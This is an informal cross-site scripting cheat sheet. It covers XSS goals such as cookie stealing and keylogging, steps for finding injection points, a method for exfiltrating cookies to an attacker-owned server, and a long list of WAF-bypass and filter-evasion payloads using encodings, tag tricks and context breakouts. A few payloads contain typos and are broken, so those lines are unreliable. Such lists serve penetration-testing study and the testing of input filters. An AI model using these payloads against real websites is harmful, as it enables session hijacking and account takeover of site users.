xss : inject html or javascript


xss goals  :

- cookie stealing
- control browser
- perform keylogging
- initiating an exploitation phase against browser plugins and then the machine

xss types :

- dom xss
- reflected xss
- stored xss


perform xss  :

- find intput/output which output is part of the user intput ex : comment bar  , search bar ,etc..
- try to inject input with html or javscript  , input : GET/POST , cookie  , HTTP headers
- test the respone of input (depends on the method application uses ) ex : (GET) with x">x or <plaintext>
-try to perform a succesful script ex: <img src=x onerror=alert(); >
-take more advantage with it



steal cookie(if httponly flag not set) :

- read cookies with js
- redirect the cookie content to a server we own
- retrieve the logged cookie from our server and install it in our beowser


evasion and waf bypass:


-



alert(1)                           =>  prompt(1);
                                       confirm(1);
                                       window[/alert/.source](1);
                                       alert(/xss/.source);


<image src=x onerror=alert(1);>    =>  <svg/onload(1)>
                                       <video src=x onerror=alert();>
                                       <audio src=x onerror=alert();>



alert(document.cookie)             =>  with(document)alert(cookie)
                                       alert(document['cookie'])
                                       alert(document[/cookie/.sourde])
                                       alert(document[/coo/.source+/kie/.source])



atob()                             =>  window.atob()





eval(atob("base64"))               =>  [].constructor.constructor(atob("base64"))()
                                   =>  setTimeout(atob("base64"))
                                   =>  setInterval(atob("base64"))
                                   =>  Function(atob("base64"))()



encode using : base64 , hex, oct , unicode ,decimal , or  compination

alert  = /ale/.source+/rt/.source
       = String.fromCharCode(97,108,101,114,116)            (decimal)
       = atob("YWxlcnQ=")                                   (base64)
       = 17795081..toString(36)                             (base 36)
       = unescape(/%61%6c%65%72%74/.source)                 (unicode) or (% hex)
       = decodeURI(/alert%28xss%29/.source)                 (url encode)
       = decodeURIComponent(/alert%28xss%29/.source)        (url encode)


<script><script>                   => <ScRiPT>alert(1);</ScRiPT>
                                      <ScRiPT>alert(1);
                                      <script/random>alert(1);</script>
                                      <scr<script>ipt>alert(1);</scr<script>ipt>
                                   =>   <script
                                      >alert(1);</script>

                                   => <object data="javascript:alert(1)">
                                      <object data="javascript&colon;alert(1)" (encode html entity)



<svg/onload=alert(1)>              => <svg//////onload=alert(1)>
                                      <svg id=x;onload=alert(1)>
                                      <svg id=1`x`onload=alert(1)>
                                      <svg 0x09onaload0x09=alert(1)>    ===> check control chars list






escaping parentheses               =><img src=x onerror="window.onerror=eval;throw'=alert(1)'" >
                                   =><img src=x onerror="window.onerror=setTimeout;throw'=alert(1)'"  >







<svg/onload=alert(1)>            inside html tag            =><svg/onload=alert(1)
                                 inside html tag attributes =>x"><svg/onload=alert(1)>
                                 inside html tag attributes =>x"><a/href="data:text/html;,alert(1)">< !--
                                 insdie script tag          =>x";alert(1);//
                                  inside event attributes   =>alert(1)


